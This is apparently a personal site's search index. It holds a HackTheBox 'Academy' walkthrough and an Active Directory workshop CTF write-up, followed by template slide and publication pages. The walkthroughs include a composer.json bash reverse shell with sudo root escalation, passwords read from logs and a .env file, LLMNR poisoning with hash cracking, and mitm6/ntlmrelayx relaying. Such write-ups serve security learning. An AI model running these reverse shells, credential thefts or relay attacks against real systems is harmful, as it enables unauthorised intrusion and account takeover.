Vulnerability CVE-2018-15133   For this exploit we\u0026rsquo;ll be using this script, a pretty easy syntax.\nhttps://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py  And voilà we\u0026rsquo;re on the box\nUser Privesc\n Now let\u0026rsquo;s start enumarating,We already know that the webserver is running PHP Laravel.  The first thing we should look at is the .env file.  And we get a password! mySup3rP4s5w0rd!!  Let\u0026rsquo;s see if it belongs to any existing user After manually trying to switch to these users, it turns out to be cry0l1t3\u0026rsquo;s password Our user is in the adm group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it\ndata=6D7262336E5F41634064336D79210A\nSeems we got a password! But it\u0026rsquo;s hex encoded! Let\u0026rsquo;s decode it\nmrb3n_Ac@d3my!\nSeems like it\u0026rsquo;s mrb3n\u0026rsquo;s password!\nRoot Privesc\n Mrb3n can execute /usr/bin/composer as root!\nGoing through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!\n{ \u0026quot;scripts\u0026quot;:{\u0026quot;shell\u0026quot;:\u0026quot;/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.111/4444 0\u0026gt;\u0026amp;1'\u0026quot;} }  We set our listener\nnc -lvnp 4444  And execute\nsudo /usr/bin/composer --working-dir=fake run-script shell  And we rooted the box!  uid=0(root) gid=0(root) groups=0(root)\nThanks for reading hope you enjoyed it! ","date":1614384000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614384000,"objectID":"bfd50a2d9567418b7c0453ee0bdf9e26","permalink":"https://mohamed-elleuch.me/writeups/htb-academy/","publishdate":"2021-02-27T00:00:00Z","relpermalink":"/writeups/htb-academy/","section":"writeups","summary":"Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations","tags":["HackTheBox"],"title":"HackTheBox - Academy Writeup","type":"writeups"},{"authors":["Mohamed Elleuch"],"categories":null,"content":"Overview of the network  TASK: LLMNR poisoning  Intercepting the user hash  We start by getting the network interface name\nsudo ifconfig  We\u0026rsquo;re going to use the responder package which comes preinstalled in kali linux. So basically we\u0026rsquo;re going to provide our network interface to responder , and let him do its magic\nsudo responder -I eth0 -rdwv  And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS. And get his NTLMv2 hash.\nUsername:naruto Hash: naruto:::0099db0783fderacking the HASH  We\u0026rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod First of all, we\u0026rsquo;re going to look for NTLMv2 Hash-Mod\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nFinally run hashcat,\nhashcat.exe -m 5600 hash.txt rockyou.txt  And we wait until hashcat cracks it\n NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd  FLAG\n Securinets{kelvinP@ssw0rd}  Task: IPv6 Attack  Preparing for the Attack  We\u0026rsquo;re going to start with gathering informations about the network\nsudo ifconfig  Network address: 10.0.0.0/24\nLet\u0026rsquo;s now find the hosts IPs, It may take a while\nnmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk '{print $6}' | uniq \u0026gt; ips.txt  Now let\u0026rsquo;s an nmap scan on the result\nsudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap  Or you can directly\nsudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap  After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller\nWe can get the domain name either from the nmap results or by enumerating the ldap\nldapsearch -h 10.0.0.7 -x -s base namingcontexts  namingcontexts: DC=SECURINETS,DC=local // SECURINETS.local is the domain name  Attacking  So basically we\u0026rsquo;re going to acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( https://github.com/fox-it/mitm6 ) which will act as IPv6 Router during the attack and ntlmrelayx ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.\nLet\u0026rsquo;s start by setting up mitm6\nsudo mitm6 -d SECURINETS.local  Let\u0026rsquo;s now set up our ntlm relay\nsudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t  And wait until we get something juicy\nA folder l00t has been created which contains informations about the AD\nAnd we grab our flag\ncat * | grep Securinets  Flag  Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}  Thanks for reading hope you enjoyed it! ","date":1614038400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1614038400,"objectID":"ba20e059084ae862f83895ca8a268e68","permalink":"https://mohamed-elleuch.me/writeups/hacklockad/","publishdate":"2021-02-23T00:00:00Z","relpermalink":"/writeups/hacklockad/","section":"writeups","summary":"I had the chance to participate in the hacklock event organized by Securinets and also win \\o/. Here's the writeup that i presented in front of the jury.","tags":["Academic"],"title":"HackLock Active Directory Workshop Writeup","type":"writeups"},{"authors":[],"categories":[],"content":"Create slides in Markdown with Wowchemy Wowchemy | Documentation\n Features  Efficiently write slides in Markdown 3-in-1: Create, Present, and Publish your slides Supports speaker notes Mobile friendly slides   Controls  Next: Right Arrow or Space Previous: Left Arrow Start: Home Finish: End Overview: Esc Speaker notes: S Fullscreen: F Zoom: Alt + Click PDF Export: E   Code Highlighting Inline code: variable\nCode block:\nporridge = \u0026quot;blueberry\u0026quot; if porridge == \u0026quot;blueberry\u0026quot;: print(\u0026quot;Eating...\u0026quot;)   Math In-line math: $x + y = z$\nBlock math:\n$$ f\\left( x \\right) = ;\\frac{{2\\left( {x + 4} \\right)\\left( {x - 4} \\right)}}{{\\left( {x + 4} \\right)\\left( {x + 1} \\right)}} $$\n Fragments Make content appear incrementally\n{{% fragment %}} One {{% /fragment %}} {{% fragment %}} **Two** {{% /fragment %}} {{% fragment %}} Three {{% /fragment %}}  Press Space to play!\nOne  Two  Three \n A fragment can accept two optional parameters:\n class: use a custom style (requires definition in custom CSS) weight: sets the order in which a fragment appears   Speaker Notes Add speaker notes to your presentation\n{{% speaker_note %}} - Only the speaker can read these notes - Press `S` key to view {{% /speaker_note %}}  Press the S key to view the speaker notes!\n Only the speaker can read these notes Press S key to view    Themes  black: Black background, white text, blue links (default) white: White background, black text, blue links league: Gray background, white text, blue links beige: Beige background, dark text, brown links sky: Blue background, thin dark text, blue links    night: Black background, thick white text, orange links serif: Cappuccino background, gray text, brown links simple: White background, black text, blue links solarized: Cream-colored background, dark green text, blue links   Custom Slide Customize the slide style and background\n{{\u0026lt; slide background-image=\u0026quot;/media/boards.jpg\u0026quot; \u0026gt;}} {{\u0026lt; slide background-color=\u0026quot;#0000FF\u0026quot; \u0026gt;}} {{\u0026lt; slide class=\u0026quot;my-style\u0026quot; \u0026gt;}}   Custom CSS Example Let\u0026rsquo;s make headers navy colored.\nCreate assets/css/reveal_custom.css with:\n.reveal section h1, .reveal section h2, .reveal section h3 { color: navy; }   Questions? Ask\nDocumentation\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549324800,"objectID":"0e6de1a61aa83269ff13324f3167c1a9","permalink":"https://mohamed-elleuch.me/slides/example/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/slides/example/","section":"slides","summary":"An introduction to using Wowchemy's Slides feature.","tags":[],"title":"Slides","type":"slides"},{"authors":["Mohamed Elleuch","Robert Ford"],"categories":null,"content":" Click the Cite button above to demo the feature to enable visitors to import publication metadata into their reference management software.    Create your slides in Markdown - click the Slides button to check out the example.   Supplementary notes can be added here, including code, math, and images.\n","date":1372636800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1372636800,"objectID":"ff6a19061a984819d30c916886db56ef","permalink":"https://mohamed-elleuch.me/publication/example/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/publication/example/","section":"publication","summary":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum.","tags":[],"title":"An example conference paper","type":"publication"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"f26b5133c34eec1aa0a09390a36c2ade","permalink":"https://mohamed-elleuch.me/admin/config.yml","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/admin/config.yml","section":"","summary":"","tags":null,"title":"","type":"wowchemycms"}]